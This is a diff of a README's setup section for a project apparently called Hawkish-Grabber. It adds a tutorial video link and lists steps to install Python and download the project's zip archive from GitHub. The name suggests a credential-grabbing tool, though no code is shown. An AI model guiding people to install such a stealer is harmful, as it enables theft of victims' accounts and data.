@@ -52,8 +52,8 @@ Youtube:
 
 
 
+##[🔱 TUTORIAL](https://dai.ly/k6j06fNNLxmYiHzbTHU)
 ## <a id="setup"></a> 📁 〢 Setting up
-##TUTORIAL: https://dai.ly/k6j06fNNLxmYiHzbTHU
 
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
 2. Install [Hawkish Files](https://github.com/Hawkish-Team/Hawkish-Grabber/archive/refs/heads/main.zip)
